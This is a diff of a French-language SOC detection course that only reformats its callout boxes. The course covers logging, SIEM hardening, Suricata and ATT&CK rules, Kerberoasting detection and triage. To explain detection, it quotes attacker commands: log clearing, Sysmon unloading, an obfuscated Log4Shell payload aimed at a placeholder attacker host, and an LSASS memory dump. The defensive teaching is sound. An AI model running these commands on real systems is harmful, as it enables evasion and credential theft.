@@ -78,7 +78,9 @@ Deux indicateurs structurent le pilotage :
 - le **MTTD** (Mean Time To Detect) : le délai entre le début d'une activité malveillante et son alerte. Il dépend de vos sources et de vos règles ;
 - le **temps de qualification** : le délai entre l'alerte et la décision. Il dépend de votre processus de triage.
 
-> 🧠 **Concept clé** : un SOC ne voit que ce qui est journalisé, collecté, parsé et corrélé. Une défaillance à n'importe quel maillon se traduit par du silence, et le silence ressemble à de la sécurité.
+> 🧠 **Concept clé**
+>
+> Un SOC ne voit que ce qui est journalisé, collecté, parsé et corrélé. Une défaillance à n'importe quel maillon se traduit par du silence, et le silence ressemble à de la sécurité.
 {: .callout .callout-important}
 
 ## Surface de visibilité : ce que le SOC voit et ne voit pas
@@ -101,10 +103,14 @@ Côté attaquant, la détection est rarement attaquée de front. On passe là o�
 - **Comptes valides** : un mot de passe deviné ou volé produit des événements parfaitement normaux.
 - **Effacement et neutralisation des journaux** : une fois administrateur local, l'attaquant s'en prend à ce qui l'observe.
 
-> 🔴 **Vecteur d'attaque** : `wevtutil cl Security` efface le journal Security (événement 1102 généré). `fltmc unload SysmonDrv` décharge le pilote Sysmon. L'arrêt du service de l'agent EDR est la troisième variante courante (T1562.001). Dans les trois cas, si les événements n'ont pas déjà quitté la machine, la preuve disparaît.
+> 🔴 **Vecteur d'attaque**
+>
+> `wevtutil cl Security` efface le journal Security (événement 1102 généré). `fltmc unload SysmonDrv` décharge le pilote Sysmon. L'arrêt du service de l'agent EDR est la troisième variante courante (T1562.001). Dans les trois cas, si les événements n'ont pas déjà quitté la machine, la preuve disparaît.
 {: .callout .callout-danger}
 
-> 🔒 **Contrôle de sécurité** : envoyer les événements en quasi temps réel vers un stockage que l'attaquant local ne peut pas modifier, et alerter sur les événements 1102 (journal Security effacé) et 104 (journal System effacé). Surtout, alerter sur le **silence** : un hôte qui cesse d'émettre est un signal.
+> 🔒 **Contrôle de sécurité**
+>
+> Envoyer les événements en quasi temps réel vers un stockage que l'attaquant local ne peut pas modifier, et alerter sur les événements 1102 (journal Security effacé) et 104 (journal System effacé). Surtout, alerter sur le **silence** : un hôte qui cesse d'émettre est un signal.
 {: .callout .callout-securite}
 
 ## Configuration sécurisée de la collecte
@@ -151,7 +157,9 @@ action(type="omfwd" target="<SIEM_HOST>" port="6514" protocol="tcp"
 
 La file sur disque (`queue.filename`) évite de perdre les événements quand le SIEM est indisponible. Sans elle, une maintenance de nuit crée un trou de plusieurs heures dans vos données.
 
-> ⚠️ **Erreur fréquente** : filtrer auditd avec `-F auid>=1000 -F auid!=4294967295` pour réduire le volume. Les processus de service ont un `auid` non défini (4294967295, soit -1 non signé), que le second filtre exclut. Le `www-data` qui lance `/bin/sh` après l'exploitation d'une application web disparaît donc de vos journaux, alors que c'est exactement ce qu'on cherche. Correction : garder les `execve` sans filtre `auid`, et exclure le bruit par processus parent ou par chemin.
+> ⚠️ **Erreur fréquente**
+>
+> Filtrer auditd avec `-F auid>=1000 -F auid!=4294967295` pour réduire le volume. Les processus de service ont un `auid` non défini (4294967295, soit -1 non signé), que le second filtre exclut. Le `www-data` qui lance `/bin/sh` après l'exploitation d'une application web disparaît donc de vos journaux, alors que c'est exactement ce qu'on cherche. Correction : garder les `execve` sans filtre `auid`, et exclure le bruit par processus parent ou par chemin.
 {: .callout .callout-attention}
 
 ### Durcir le SIEM lui-même
@@ -186,10 +194,12 @@ Deux points techniques font perdre des heures :
 
 ### Un exemple : le password spraying
 
-> 📖 **Définition.** Le password spraying (T1110.003) contourne le verrouillage de compte : l'attaquant essaie **un seul mot de passe** (`Printemps2025!`, `<NomEntreprise>2025!`) sur des centaines de comptes, en restant sous le seuil de verrouillage.
-{: .callout .callout-definition}
-
 Les outils courants sont `kerbrute passwordspray`, `MSOLSpray` ou Hydra.
+
+> 📖 **Définition**
+>
+> Le password spraying (T1110.003) contourne le verrouillage de compte : l'attaquant essaie **un seul mot de passe** (`Printemps2025!`, `<NomEntreprise>2025!`) sur des centaines de comptes, en restant sous le seuil de verrouillage.
+{: .callout .callout-definition}
 
 Une règle « plus de 5 échecs pour un même compte » ne se déclenche jamais, puisque chaque compte n'en reçoit qu'un. Il faut compter les **comptes distincts par source** :
 
@@ -235,17 +245,23 @@ Un exemple de règle locale Suricata pour Log4Shell (CVE-2021-44228) montre à l
 alert http any any -> $HOME_NET any (msg:"LOCAL Log4Shell JNDI in URI"; flow:established,to_server; http.uri; content:"${jndi:"; nocase; sid:1000001; rev:1;)
 ```
 
-> 🔴 **Vecteur d'attaque** : l'attaquant place le payload dans `User-Agent` ou `X-Api-Version`, pas seulement dans l'URI. Il l'obfusque aussi avec `${${lower:j}ndi:${lower:l}dap://<ATTACKER>/a}`. La règle ci-dessus ne voit ni l'un ni l'autre. Les signatures commerciales couvrent plusieurs buffers et variantes. Elles ne couvrent jamais tout, ce qui oblige à corroborer avec le comportement du serveur (connexion sortante vers un LDAP externe, processus enfant de Java).
+> 🔴 **Vecteur d'attaque**
+>
+> L'attaquant place le payload dans `User-Agent` ou `X-Api-Version`, pas seulement dans l'URI. Il l'obfusque aussi avec `${${lower:j}ndi:${lower:l}dap://<ATTACKER>/a}`. La règle ci-dessus ne voit ni l'un ni l'autre. Les signatures commerciales couvrent plusieurs buffers et variantes. Elles ne couvrent jamais tout, ce qui oblige à corroborer avec le comportement du serveur (connexion sortante vers un LDAP externe, processus enfant de Java).
 {: .callout .callout-danger}
 
-> 💡 **Astuce** : sur les captures de test, `suricata -r <PCAP> -l <OUT_DIR> -k none` désactive la vérification des checksums. Les captures prises sur une interface avec offloading ont des checksums invalides et sinon le trafic est ignoré.
+> 💡 **Astuce**
+>
+> Sur les captures de test, `suricata -r <PCAP> -l <OUT_DIR> -k none` désactive la vérification des checksums. Les captures prises sur une interface avec offloading ont des checksums invalides et sinon le trafic est ignoré.
 {: .callout .callout-astuce}
 
 ## MITRE ATT&CK et règles de détection
 
 ATT&CK* est un vocabulaire commun, qui décrit l'attaquant sur trois niveaux.
 
-> 🔑 **Moyen mnémotechnique** : retenez **TTP**, du plus abstrait au plus concret. La **tactique** dit pourquoi l'attaquant agit (accès aux identifiants), la **technique** dit comment (T1003, OS Credential Dumping), la **procédure** dit avec quoi (`rundll32 comsvcs.dll, MiniDump`).
+> 🔑 **Moyen mnémotechnique**
+>
+> Retenez **TTP**, du plus abstrait au plus concret. La **tactique** dit pourquoi l'attaquant agit (accès aux identifiants), la **technique** dit comment (T1003, OS Credential Dumping), la **procédure** dit avec quoi (`rundll32 comsvcs.dll, MiniDump`).
 {: .callout .callout-memo}
 
 Les règles se rédigent au niveau des procédures observées, l'étiquette ATT&CK sert à mesurer la couverture.
@@ -286,7 +302,9 @@ Pour extraire des identifiants en mémoire (T1003.001), l'attaquant ouvre le pro
 
 Le problème est que les antivirus, l'EDR et certains agents de sauvegarde ouvrent aussi LSASS. Brut, la règle génère des centaines d'alertes. On construit donc une liste d'autorisation par `SourceImage` signé et par chemin, et on alerte sur tout le reste. C'est de l'ingénierie de détection, pas de la configuration.
 
-> ⚠️ **Erreur fréquente** : présenter une carte ATT&CK « verte » comme une preuve de couverture. Une règle sur T1059.001 ne couvre qu'une variante de la technique, avec une source de données précise. La couverture réelle se mesure en rejouant des procédures (voir plus bas), pas en comptant des cases.
+> ⚠️ **Erreur fréquente**
+>
+> Présenter une carte ATT&CK « verte » comme une preuve de couverture. Une règle sur T1059.001 ne couvre qu'une variante de la technique, avec une source de données précise. La couverture réelle se mesure en rejouant des procédures (voir plus bas), pas en comptant des cases.
 {: .callout .callout-attention}
 
 ### Contrôles de détection prioritaires
@@ -304,12 +322,16 @@ Le problème est que les antivirus, l'EDR et certains agents de sauvegarde ouvre
 
 Pourquoi le Kerberoasting (T1558.003) est-il si discret ? Tout utilisateur du domaine peut demander un ticket de service pour un compte avec SPN. Le KDC chiffre ce ticket avec une clé dérivée du mot de passe du compte de service. L'attaquant le casse hors ligne, sans autre alerte réseau (`GetUserSPNs.py` d'Impacket, `Rubeus kerberoast`).
 
-> 🔐 **Analogie : le cadenas emporté.** Le KDC remet à tout employé qui le demande un cadenas fermé avec le mot de passe du compte de service. L'attaquant l'emporte chez lui et essaie les combinaisons à son rythme, sans que personne ne voie ses tentatives. Limite : seul un mot de passe faible cède. Un mot de passe long et aléatoire, comme celui d'un gMSA, résiste en pratique.
+> 🔐 **Analogie : le cadenas emporté**
+>
+> Le KDC remet à tout employé qui le demande un cadenas fermé avec le mot de passe du compte de service. L'attaquant l'emporte chez lui et essaie les combinaisons à son rythme, sans que personne ne voie ses tentatives. Limite : seul un mot de passe faible cède. Un mot de passe long et aléatoire, comme celui d'un gMSA, résiste en pratique.
 {: .callout .callout-analogie}
 
 Côté détection, on cherche un même compte qui demande plusieurs services en quelques minutes, avec chiffrement RC4 (0x17), pour des noms de service qui ne finissent pas par `$` et ne sont pas `krbtgt`. Les applications anciennes qui exigent RC4 créent du bruit : il faut les inventorier.
 
-> 🔒 **Contrôle de sécurité** : créer un compte leurre avec un SPN attractif, qu'aucun service réel n'utilise. Toute demande de ticket pour ce compte est suspecte, avec un taux de faux positifs proche de zéro. Réduire l'exposition à la source aide aussi : comptes de service gérés (gMSA) pour les services qui le permettent, AES imposé via `msDS-SupportedEncryptionTypes`.
+> 🔒 **Contrôle de sécurité**
+>
+> Créer un compte leurre avec un SPN attractif, qu'aucun service réel n'utilise. Toute demande de ticket pour ce compte est suspecte, avec un taux de faux positifs proche de zéro. Réduire l'exposition à la source aide aussi : comptes de service gérés (gMSA) pour les services qui le permettent, AES imposé via `msDS-SupportedEncryptionTypes`.
 {: .callout .callout-securite}
 
 ## Triage, enrichissement et escalade
@@ -352,7 +374,9 @@ Le verdict se range dans quatre catégories :
 - **faux positif** : la règle s'est déclenchée à tort ;
 - **indéterminé**.
 
-> 💡 **À retenir** : la catégorie « vrai positif bénin » est la plus utile, car elle conduit à affiner la règle plutôt qu'à la désactiver.
+> 💡 **À retenir**
+>
+> La catégorie « vrai positif bénin » est la plus utile, car elle conduit à affiner la règle plutôt qu'à la désactiver.
 {: .callout .callout-important}
 
 ### Escalader : le contenu du dossier
@@ -367,7 +391,9 @@ Une escalade qui oblige l'équipe suivante à tout refaire est une mauvaise esca
 
 ## Une alerte n'est pas une preuve suffisante de compromission
 
-> ⚠️ C'est la discipline centrale du métier. Une alerte est **une hypothèse produite par une règle**. Elle devient une conclusion quand des observations indépendantes la corroborent. On distingue trois niveaux :
+> ⚠️ **Attention**
+>
+> C'est la discipline centrale du métier. Une alerte est **une hypothèse produite par une règle**. Elle devient une conclusion quand des observations indépendantes la corroborent. On distingue trois niveaux :
 {: .callout .callout-attention}
 
 1. **Alerte** : une règle ou un modèle a émis un signal.
@@ -383,7 +409,9 @@ Une escalade qui oblige l'équipe suivante à tout refaire est une mauvaise esca
 
 La règle fonctionne dans les deux sens. Ne pas écrire « poste compromis » dans un ticket quand on a seulement « activité suspecte, non confirmée » : les mots engagent une chaîne de décisions, et parfois un salarié. À l'inverse, ne pas clore une alerte parce qu'elle ressemble à du bruit habituel : un scanner d'Internet qui envoie du Log4Shell est du bruit, celui qui obtient une réponse 200 et déclenche une connexion sortante ne l'est plus.
 
-> 🧠 **Concept clé** : le triage consiste à chercher une deuxième source qui contredit ou confirme la première. Avoir un seul signal, c'est avoir une hypothèse.
+> 🧠 **Concept clé**
+>
+> Le triage consiste à chercher une deuxième source qui contredit ou confirme la première. Avoir un seul signal, c'est avoir une hypothèse.
 {: .callout .callout-important}
 
 ## Création et amélioration de cas d'usage de détection
@@ -434,7 +462,9 @@ Une règle n'existe que si on a prouvé qu'elle se déclenche. Quelques vérific
 | Rejeu d'une technique | `Invoke-AtomicTest T1053.005 -TestNumbers 1` puis `-Cleanup` | Alerte 4698 ou règle associée déclenchée |
 | Conversion de règle | `sigma convert -t <BACKEND> -p <PIPELINE> <RULE_FILE>` | Requête valide pour votre SIEM |
 
-> 💡 **Astuce** : lancez `Invoke-AtomicTest <TECHNIQUE> -ShowDetails` avant toute exécution pour lire ce que fait le test. Certains tests sont destructeurs (la suppression des shadow copies, T1490, en est un). À exécuter uniquement sur une machine de laboratoire ou autorisée, avec un instantané disponible. Les numéros de tests varient selon la version.
+> 💡 **Astuce**
+>
+> Lancez `Invoke-AtomicTest <TECHNIQUE> -ShowDetails` avant toute exécution pour lire ce que fait le test. Certains tests sont destructeurs (la suppression des shadow copies, T1490, en est un). À exécuter uniquement sur une machine de laboratoire ou autorisée, avec un instantané disponible. Les numéros de tests varient selon la version.
 {: .callout .callout-astuce}
 
 Pour détecter le beaconing, un `sort | uniq -c` ne suffit pas : la régularité temporelle est le signal. Des outils comme RITA calculent cette régularité sur les journaux Zeek.
